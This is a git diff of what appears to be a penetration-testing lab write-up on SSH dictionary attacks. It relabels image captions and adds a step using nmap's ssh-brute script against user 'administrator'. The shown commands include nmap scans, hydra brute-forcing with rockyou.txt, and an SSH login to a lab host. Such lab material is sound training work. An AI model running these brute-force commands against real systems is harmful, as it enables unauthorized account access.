@@ -43,9 +43,9 @@ nmap 192.239.69.3
 nmap 192.239.69.3 -p 22 -sV -O
 <br/>
 <br/>
-<img src="https://i.imgur.com/WAHtHYv.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<img src="https://i.imgur.com/WAHtHYv.png" height="80%" width="80%" alt="SSH Dictionary Attack" class="center"/>
 <br />
-<img src="https://i.imgur.com/7f8KtmC.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<img src="https://i.imgur.com/7f8KtmC.png" height="80%" width="80%" alt="SSH Dictionary Attack" class="center"/>
 <br />
 <br />
 <br />
@@ -67,7 +67,7 @@ Commands: gzip -d /usr/share/wordlists/rockyou.txt.gz
 hydra -l student -P /usr/share/wordlists/rockyou.txt 192.239.69.3 ssh
 <br/>
 <br/>
-<img src="https://i.imgur.com/2BTukDQ.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<img src="https://i.imgur.com/2BTukDQ.png" height="80%" width="80%" alt="SSH Dictionary Attack" class="center"/>
 <br />
 <br />
 <br />
@@ -83,7 +83,25 @@ Now that we have a valid password for the user "student", test an SSH log in: <b
 Command: ssh student@192.239.69.3
 <br/>
 <br/>
-<img src="https://i.imgur.com/NkUnaRy.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<img src="https://i.imgur.com/NkUnaRy.png" height="80%" width="80%" alt="SSH Dictionary Attack" class="center"/>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+Utilize the Nmap tool to try and find a valid password for user "administrator": <br/>
+<br/>
+- We can see that nmap started brute forcing by trying multiple passwords for user "administrator" until if found a match with the password sunshine. 
+<br/>
+<br/>
+Commands: echo "administrator" > user
+<br/>
+nmap 192.239.69.3 -p 22 --script ssh-brute --script-args userdb=/root/user
+<br/>
+<br/>
+<img src="https://i.imgur.com/hyyFnMI.png" height="80%" width="80%" alt="SSH Dictionary Attack" class="center"/>
 <br />
 <br />
 <br />
